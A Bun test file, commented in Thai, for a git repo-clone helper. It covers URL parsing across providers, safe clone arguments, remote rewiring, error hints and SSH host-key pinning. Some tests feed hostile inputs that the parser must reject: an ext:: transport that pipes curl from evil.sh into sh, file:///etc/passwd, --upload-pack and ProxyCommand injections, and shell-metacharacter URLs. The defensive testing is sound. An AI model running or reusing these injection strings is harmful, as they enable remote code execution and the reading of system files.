import { test, expect } from "bun:test";

import {
  parseRepoUrl,
  buildCloneArgs,
  remoteRewirePlan,
  cloneErrorHint,
  CLONE_SOURCE_NO_PUSH,
  parseKeyscanFingerprints,
  decideHostKeys,
  knownHostsHasHost,
  isSshUrl,
} from "./repoClone";

test("parseRepoUrl: GitHub https + .git", () => {
  const r = parseRepoUrl("https://github.com/octocat/Hello-World.git");
  expect(r.valid).toBe(true);
  expect(r.provider).toBe("github");
  expect(r.repo).toBe("Hello-World");
});

test("parseRepoUrl: GitHub ssh scp-form", () => {
  const r = parseRepoUrl("git@github.com:MyMissionControl/orches-skills.git");
  expect(r.valid).toBe(true);
  expect(r.provider).toBe("github");
  expect(r.repo).toBe("orches-skills");
});

test("parseRepoUrl: Azure DevOps https (_git/<repo>)", () => {
  const r = parseRepoUrl("https://dev.azure.com/myorg/MyProject/_git/my-repo");
  expect(r.valid).toBe(true);
  expect(r.provider).toBe("azure-devops");
  expect(r.repo).toBe("my-repo"); // ⛔ ไม่ใช่ "_git" และไม่ใช่ชื่อ project
});

test("parseRepoUrl: Azure DevOps https ที่มี org ติดมาหน้า host", () => {
  const r = parseRepoUrl("https://myorg@dev.azure.com/myorg/MyProject/_git/my-repo");
  expect(r.valid).toBe(true);
  expect(r.provider).toBe("azure-devops");
  expect(r.repo).toBe("my-repo");
});

test("parseRepoUrl: Azure DevOps แบบเก่า visualstudio.com + ssh v3", () => {
  expect(parseRepoUrl("https://myorg.visualstudio.com/MyProject/_git/my-repo").provider).toBe(
    "azure-devops",
  );
  const ssh = parseRepoUrl("git@ssh.dev.azure.com:v3/myorg/MyProject/my-repo");
  expect(ssh.valid).toBe(true);
  expect(ssh.provider).toBe("azure-devops");
  expect(ssh.repo).toBe("my-repo");
});

// URL จริงคู่หนึ่งจากงานจริง (user แปะมา 2026-08-13): https กับ ssh ของ repo เดียวกัน
// ⛔ สัญญา = ทั้งสองแบบต้องได้ชื่อ **เดียวกัน** เพราะเป็นชื่อโปรเจคที่จะเอาไปตั้งโฟลเดอร์
test("parseRepoUrl: Azure DevOps ของจริง https/ssh ต้องได้ชื่อเดียวกัน", () => {
  const https = parseRepoUrl(
    "https://TexploreProject@dev.azure.com/TexploreProject/TexploreDigitalSandbox/_git/TexploreFITs",
  );
  const ssh = parseRepoUrl(
    "git@ssh.dev.azure.com:v3/TexploreProject/TexploreDigitalSandbox/TexploreFITs",
  );
  expect(https.repo).toBe("TexploreFITs"); // ไม่ใช่ TexploreProject / TexploreDigitalSandbox / _git
  expect(ssh.repo).toBe("TexploreFITs"); // ssh ไม่มี _git → segment สุดท้าย (ไม่ใช่ v3)
  expect(ssh.repo).toBe(https.repo);
  expect(https.provider).toBe("azure-devops");
  expect(ssh.provider).toBe("azure-devops");
});

test("parseRepoUrl: เจ้าอื่นก็รับ แต่บอกชื่อให้ถูก", () => {
  expect(parseRepoUrl("https://gitlab.com/g/sub/proj.git").provider).toBe("gitlab");
  expect(parseRepoUrl("https://gitlab.com/g/sub/proj.git").repo).toBe("proj");
  expect(parseRepoUrl("https://bitbucket.org/team/repo").provider).toBe("bitbucket");
  expect(parseRepoUrl("https://git.company.internal/team/repo.git").provider).toBe("other");
});

test("⛔ parseRepoUrl: ปฏิเสธ transport ที่รันคำสั่งได้ (ext::) — นี่คือ RCE ไม่ใช่ typo", () => {
  const r = parseRepoUrl("ext::sh -c 'curl http://evil.sh | sh'");
  expect(r.valid).toBe(false);
  expect(r.reason).toBeTruthy();
});

test("⛔ parseRepoUrl: ปฏิเสธ file://, ค่าที่ขึ้นต้นด้วย -, และอักขระ shell", () => {
  for (const bad of [
    "file:///etc/passwd",
    "--upload-pack=/bin/sh",
    "-oProxyCommand=id",
    "https://github.com/a/b ; id",
    "https://github.com/a/b\nhttps://x/y",
    "https://github.com/a/`id`",
    "http://github.com/a/b", // https/ssh เท่านั้น
  ]) {
    expect(parseRepoUrl(bad).valid).toBe(false);
  }
});

test("parseRepoUrl: ต้องมี path ของ repo จริง ๆ", () => {
  expect(parseRepoUrl("https://github.com").valid).toBe(false);
  expect(parseRepoUrl("https://github.com/onlyowner").valid).toBe(false);
  expect(parseRepoUrl("").valid).toBe(false);
  expect(parseRepoUrl("   ").valid).toBe(false);
});

test("buildCloneArgs: มี `--` กั้น เสมอ (URL มาจาก webview)", () => {
  const a = buildCloneArgs("https://github.com/o/r.git", "/p/projects/r");
  expect(a[0]).toBe("clone");
  expect(a).toContain("--");
  expect(a.indexOf("--")).toBeLessThan(a.indexOf("https://github.com/o/r.git"));
  expect(a[a.length - 1]).toBe("/p/projects/r");
});

test("remoteRewirePlan: origin ของ clone ต้องกลายเป็น upstream ที่ push ไม่ได้", () => {
  const plan = remoteRewirePlan("main");
  const flat = plan.map((a) => a.join(" "));
  expect(flat).toContain("remote rename origin upstream"); // เก็บที่มาไว้ ไม่ลบทิ้ง
  expect(flat.some((c) => c.startsWith("remote set-url --push upstream "))).toBe(true);
  expect(flat.join("\n")).toContain(CLONE_SOURCE_NO_PUSH);
  // ⛔ ห้ามเหลือ branch ที่ track upstream — `git push` เปล่า ๆ จะยิงขึ้นของคนอื่น
  expect(flat).toContain("config --unset branch.main.remote");
  // ห้ามมี origin ค้าง: engine (ensure_remote) ต้องเห็นว่า "ยังไม่มี origin" แล้วสร้าง repo ของเราเอง
  expect(flat.join(" ")).not.toContain("remote add origin");
});

test("remoteRewirePlan: default branch ไม่ใช่ main ก็ต้องถูก", () => {
  expect(remoteRewirePlan("master").map((a) => a.join(" "))).toContain(
    "config --unset branch.master.remote",
  );
});

test("cloneErrorHint: auth ไม่ผ่าน ต้องบอกว่าไปล็อกอินที่ไหน ไม่ใช่โยน stderr ดิบ", () => {
  for (const e of [
    "fatal: Authentication failed for 'https://dev.azure.com/org/proj/_git/repo/'",
    "fatal: could not read Username for 'https://github.com': terminal prompts disabled",
  ]) {
    const h = cloneErrorHint(e);
    expect(h).toContain("auth");
    expect(h.length).toBeGreaterThan(20);
  }
});

test("cloneErrorHint: ssh key ต้องแยกจาก auth แบบ https", () => {
  expect(cloneErrorHint("git@github.com: Permission denied (publickey).")).toContain("ssh");
});

test("cloneErrorHint: repo ไม่มีจริง = คนละปัญหากับ auth", () => {
  const h = cloneErrorHint("remote: Repository not found.\nfatal: repository 'x' not found");
  expect(h).toContain("ไม่เจอ");
  expect(h).not.toContain("ssh");
});

test("cloneErrorHint: ไม่รู้จัก = คืนบรรทัดจริงของ git (ห้ามคืนค่าว่าง)", () => {
  const h = cloneErrorHint("fatal: something nobody has seen before");
  expect(h).toContain("something nobody has seen before");
  expect(cloneErrorHint("").length).toBeGreaterThan(0);
});

// ── ssh host key (แก้เคส "clone ครั้งแรกล้มเพราะ known_hosts ว่าง") ──────────
const GH_REAL = [
  "SHA256:uNiVztksCsDhcc0u9e8BujQXVUpKZIDTMczCvj3tD2s",
  "SHA256:p2QAMXNIC1TJYWeIOttrVc98/R1BUFWu3/LiyKgUfQM",
  "SHA256:+DiY3wvvV6TuJJhbpZisF/zLDA0zPMSvHdkr4UvCOqU",
];

test("parseKeyscanFingerprints: อ่าน output ของ ssh-keygen -lf", () => {
  const raw =
    "3072 SHA256:uNiVztksCsDhcc0u9e8BujQXVUpKZIDTMczCvj3tD2s github.com (RSA)\n" +
    "256 SHA256:p2QAMXNIC1TJYWeIOttrVc98/R1BUFWu3/LiyKgUfQM github.com (ECDSA)\n";
  expect(parseKeyscanFingerprints(raw)).toEqual([GH_REAL[0], GH_REAL[1]]);
});

test("decideHostKeys: host ที่ pin ไว้ + key ตรง = เชื่อได้", () => {
  const d = decideHostKeys("github.com", GH_REAL.map((fp, i) => ({ line: "line" + i, fp })));
  expect(d.verdict).toBe("pin-ok");
  expect(d.keep).toEqual(["line0", "line1", "line2"]);
});

test("⛔ decideHostKeys: ไม่มี key ไหนตรง pin เลย = ปฏิเสธ (อาจถูกดักกลางทาง)", () => {
  const d = decideHostKeys("github.com", [{ line: "l", fp: "SHA256:totallyBogusKeyValue000000000000000000000" }]);
  expect(d.verdict).toBe("pin-mismatch");
  expect(d.keep).toEqual([]);
});

test("decideHostKeys: key แปลกปลอมปนมากับของจริง = เก็บแค่ตัวที่ตรง pin", () => {
  const d = decideHostKeys("github.com", [
    { line: "good", fp: GH_REAL[0] },
    { line: "unknown-new-keytype", fp: "SHA256:somethingElse" },
  ]);
  expect(d.verdict).toBe("pin-ok");
  expect(d.keep).toEqual(["good"]);
});

test("decideHostKeys: host ที่ไม่ได้ pin = TOFU แต่ต้องบอกว่าเป็น TOFU", () => {
  const d = decideHostKeys("git.company.internal", [{ line: "l", fp: "SHA256:x" }]);
  expect(d.verdict).toBe("unpinned");
  expect(d.keep).toEqual(["l"]);
});

test("decideHostKeys: scan ไม่ได้อะไรเลย", () => {
  expect(decideHostKeys("github.com", []).verdict).toBe("empty");
});

test("knownHostsHasHost: เจอ/ไม่เจอ host ในไฟล์ (เขียนแบบไม่ hash จึงอ่านได้)", () => {
  const raw = "ssh.dev.azure.com ssh-rsa AAAAB3Nz...\ngithub.com ssh-ed25519 AAAAC3...\n";
  expect(knownHostsHasHost(raw, "ssh.dev.azure.com")).toBe(true);
  expect(knownHostsHasHost(raw, "github.com")).toBe(true);
  expect(knownHostsHasHost(raw, "gitlab.com")).toBe(false);
  expect(knownHostsHasHost("", "github.com")).toBe(false);
  expect(knownHostsHasHost(raw, "hub.com")).toBe(false);
});

test("isSshUrl: แยก ssh/scp-form ออกจาก https", () => {
  expect(isSshUrl("git@ssh.dev.azure.com:v3/o/p/r")).toBe(true);
  expect(isSshUrl("ssh://git@ssh.dev.azure.com/v3/o/p/r")).toBe(true);
  expect(isSshUrl("https://github.com/o/r.git")).toBe(false);
});

test("⛔ cloneErrorHint: host key ของ 'เซิร์ฟเวอร์' ต้องไม่ถูกบอกว่าเป็น key ของเรา", () => {
  const h = cloneErrorHint("Host key verification failed. fatal: Could not read from remote repository.");
  expect(h).toContain("known_hosts");
  expect(h).not.toContain("เพิ่ม key ของเครื่องนี้ที่ provider");
  expect(cloneErrorHint("git@github.com: Permission denied (publickey).")).toContain("provider");
});
